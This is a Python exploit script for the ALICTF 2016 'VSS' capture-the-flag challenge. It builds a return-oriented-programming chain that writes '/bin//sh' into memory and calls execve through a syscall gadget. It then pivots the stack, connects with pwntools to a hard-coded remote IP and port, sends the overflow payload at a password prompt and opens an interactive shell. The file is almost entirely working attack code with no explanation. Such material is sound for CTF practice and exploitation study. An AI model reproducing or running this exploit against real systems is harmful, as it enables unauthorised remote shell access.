#!/usr/bin/python
#
# ALICTF 2016
# VSS - 50pts
#

import sys
import time
from pwn import *
from struct import pack

# Padding goes here
p = ''

p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x000000000046f208) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045f2a5) # syscall ; ret


add_rsp = 0x46f216 # : xor eax, eax ; add rsp, 0x58 ; ret
payload = "pyAAAAAA" + "A"*64 + pack("<Q", add_rsp) + "XXXXXXXX" + p

sock = remote('121.40.56.102', 2333)
sock.recvuntil("Password:\n")
sock.sendline(payload)
time.sleep(0.5)
sock.interactive()


